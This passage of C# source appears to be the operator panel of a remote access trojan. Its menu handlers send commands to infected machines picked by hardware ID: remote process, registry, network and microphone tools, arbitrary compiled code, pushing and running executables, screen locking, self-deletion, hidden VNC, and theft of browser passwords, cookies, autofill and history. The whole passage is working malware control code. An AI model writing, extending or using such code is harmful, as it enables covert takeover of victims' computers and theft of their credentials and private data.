                    pack.ForcePathObject("Packet").AsString = "process";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Process Tool on [{hwid}]...");
                }
            }
        }

        private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var network = (singleFormNetwork)Application.OpenForms["network:" + hwid];
                if (network == null)
                {
                    network = new singleFormNetwork
                    {
                        Name = "network:" + hwid,
                        Text = "network:" + hwid,
                        HWID = hwid
                    };
                    network.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "network";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Netstat Tool on [{hwid}]...");
                }
            }
        }

        private void deviceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var device = (singleFormDevice)Application.OpenForms["device:" + hwid];
                if (device == null)
                {
                    device = new singleFormDevice
                    {
                        Name = "device:" + hwid,
                        Text = "device:" + hwid,
                        HWID = hwid
                    };
                    device.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "device";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Device Tool for [{hwid}]...");
                }
            }
        }

        private void registryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var singleFormRegistry = (singleFormRegistry)Application.OpenForms["regedit:" + hwid];
                if (singleFormRegistry == null)
                {
                    singleFormRegistry = new singleFormRegistry
                    {
                        Name = "regedit:" + hwid,
                        Text = "regedit:" + hwid,
                        HWID = hwid
                    };
                    singleFormRegistry.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "LoadRegistryKey";
                    pack.ForcePathObject("RootKeyName").AsString = "";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Registry Tool for [{hwid}]...");
                }
            }
        }

        private void voiceToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var singleFormVoice = (singleFormVoice)Application.OpenForms["voice:" + hwid];
                if (singleFormVoice == null)
                {
                    singleFormVoice = new singleFormVoice
                    {
                        Name = "voice:" + hwid,
                        Text = "voice:" + hwid,
                        HWID = hwid
                    };
                    singleFormVoice.Show();

                    var pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "voice";
                    pack.ForcePathObject("TargetClient").AsString = hwid;

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    AppandLog($"Opened Voice Tool for [{hwid}]...");
                }
            }
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "Stop";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Stopped [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void disconnnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "Disconnnect";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Disconnected [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "Restart";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Restarted [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count < 1) return;
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Multiselect = false;
                openFileDialog.Filter = "(*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
                    {
                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "option";
                        pack.ForcePathObject("Command").AsString = "Update";
                        pack.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
                        pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                        AppandLog($"Updated {openFileDialog.FileName} on [{listViewItem.SubItems[3].Text}]...");
                    }
                }
            }
        }

        private void deleteSelfToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "DeleteSelf";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"SelfDeletd on [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void reBootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "ReBoot";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Reboot [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void powerOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "PowerOff";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Power Off [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "option";
                pack.ForcePathObject("Command").AsString = "LogOut";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Log Out [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            string Msgbox = Interaction.InputBox("Type in the message", "Message Box", "Hello World!");
            if (string.IsNullOrEmpty(Msgbox)) return;
            var source = Resources.Message_Box.Replace("%qwqdanchun%", Msgbox);

            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll-=>System.Windows.Forms.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Sent Message:\"{Msgbox}\" to Client [{hwid}]");
            }
        }

        private void fromURLToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count < 1) return;
            var Msgbox = Interaction.InputBox("Type in the URL of the file", "File URL",
                "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe");

            var source = Resources.Send_File_From_URL.Replace("%qwqdanchun%", Msgbox);
            var listViewItem = (ListViewItem)listViewHome.Tag;

            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Sent Web Url File to Client [{hwid}]...");
            }
        }

        private void fromDiskToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count < 1) return;
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Multiselect = false;
                openFileDialog.Filter = "(*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var source = Resources.Send_File_From_Disk
                        .Replace("%qwqdanchun%",
                            Convert.ToBase64String(File.ReadAllBytes(openFileDialog.FileName)))
                        .Replace("%Extension%", Path.GetExtension(openFileDialog.FileName));

                    foreach (ListViewItem item in listViewHome.SelectedItems)
                    {
                        string hwid = item.SubItems[3].Text;
                        var pack = new MsgPack();
                        pack.ForcePathObject("Packet").AsString = "codedom";
                        pack.ForcePathObject("TargetClient").AsString = hwid;
                        pack.ForcePathObject("Source").AsString = source;
                        pack.ForcePathObject("References").AsString = "System.dll";

                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Type").AsString = "Controler";
                        msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                        msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                        msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                        ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                        AppandLog($"Sent File [{openFileDialog.FileName}] to Client [{hwid}]...");
                    }
                }
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            string Msgbox = Interaction.InputBox("Type in the URL", "Visit Website", "https://www.bing.com/");
            if (string.IsNullOrEmpty(Msgbox)) return;
                    
            var source = Resources.Visit_Website.Replace("%qwqdanchun%", Msgbox);

            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = source;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Sent Visit {Msgbox} Site to Client [{hwid}]...");
            }
        }

        private void informationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;
                pack.ForcePathObject("Source").AsString = Resources.Information;
                pack.ForcePathObject("References").AsString =
                    "System.dll-=>Microsoft.VisualBasic.dll-=>System.Management.dll-=>System.Core.dll-=>System.Windows.Forms.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Getting Information about [{listViewItem.SubItems[3].Text}]...");
            }
        }

        private void injectShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Haven't Done!");
        }

        private void installToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = Resources.Install;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Opened Install Tool for [{hwid}]...");
            }
            
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;

                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = Resources.Uninstall;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Opened UnInstall Tool for [{hwid}]...");
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var proxy = (singleFormReverseProxy)Application.OpenForms[
                        "reverseproxy:" + hwid];
                if (proxy == null)
                {
                    proxy = new singleFormReverseProxy
                    {
                        Name = "reverseproxy:" + hwid,
                        Text = "reverseproxy:" + hwid,
                        HWID = hwid
                    };
                    proxy.Show();
                }
            }
        }

        private void noteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listViewHome.SelectedItems.Count < 1) return;

            string Msgbox = Interaction.InputBox("Type in the Note", "Note", "John Doe");

            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                var listViewItem = item;
                if (!listViewItem.SubItems[2].Text.Contains("-"))
                {
                    listViewItem.SubItems[2].Text = Msgbox + "-" + listViewItem.SubItems[2].Text;
                }
                else
                {
                    listViewItem.SubItems[2].Text = Msgbox + "-" + listViewItem.SubItems[2].Text.Split(new[] { "-" }, StringSplitOptions.None)[1];
                }

                listViewHome.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);

                XDocument myDoc = XDocument.Load(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));

                IEnumerable<XElement> products = from c in myDoc.Descendants("Client") where c.FirstAttribute.Value == listViewItem.SubItems[3].Text select c;
                if (products.Count() > 0)
                {
                    XElement product = products.First();
                    product.ReplaceNodes(new XElement("Note", Msgbox));
                }
                else
                {
                    XElement newElement = new XElement("Client", new XAttribute("HWID", listViewItem.SubItems[3].Text), new XElement("Note", Msgbox));
                    myDoc.Descendants("Clients").First().Add(newElement);
                }
                myDoc.Save(Path.Combine(Application.StartupPath, "Clients Folder", "Note.xml"));
            }
        }

        private void lockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = Resources.LockScreen_ON;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Sent Lock Command To Client [{hwid}]...");
            }
        }

        private void unlockToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = Resources.LockScreen_OFF;
                pack.ForcePathObject("References").AsString = "System.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                AppandLog($"Sent UnLock Command To Client [{hwid}]...");
            }
        }

        private void richTextBoxlog_TextChanged(object sender, EventArgs e)
        {
            richTextBoxlog.SelectionStart = richTextBoxlog.TextLength;
            richTextBoxlog.ScrollToCaret();
        }

        private void informationCollectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = "codedom";
                pack.ForcePathObject("TargetClient").AsString = hwid;
                pack.ForcePathObject("Source").AsString = Resources.Information;
                pack.ForcePathObject("References").AsString =
                    "System.dll-=>Microsoft.VisualBasic.dll-=>System.Management.dll-=>System.Core.dll-=>System.Windows.Forms.dll";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
            }
        }

        
        public void changeConnectedClients()
        {
            stConnectedCountLabel.Text = listViewHome.Items.Count.ToString();
        }
        private void listViewHome_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            stSelectedCountLabel.Text = listViewHome.SelectedItems.Count.ToString();
            foreach(ListViewItem item in listViewHome.SelectedItems)
            {
                string hwid = item.SubItems[3].Text;
            }
        }

        private void selAllButton_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listViewHome.Items)
            {
                item.Selected = true;
            }
        }

        private void listViewHome_DoubleClick(object sender, EventArgs e)
        {
            Form hvnc_from = new FrmVNC();
            hvnc_from.Show();
        }
        private void SendRequest(string sign)
        {
            foreach (ListViewItem listViewItem in listViewHome.SelectedItems)
            {
                var pack = new MsgPack();
                pack.ForcePathObject("Packet").AsString = sign;
                pack.ForcePathObject("TargetClient").AsString = listViewItem.SubItems[3].Text;
                pack.ForcePathObject("Source").AsString = Resources.Information;
                pack.ForcePathObject("References").AsString = "";

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Type").AsString = "Controler";
                msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                FormMain.childForm_Home.AppandLog($"Request {sign} to Client [{Setting.HWID}]");
            }
        }
        private void passwordsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_PASSWORD);
        }

        private void autoFillsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_AUTOFILL);
        }

        private void bookmarksToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_BOOKMARKS);
        }

        private void historiesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_HISTORY);
        }

        private void cookiesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_COOKIE);
        }

        private void allDataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendRequest(Shared.Commands.GET_ALL);
        }
    }
}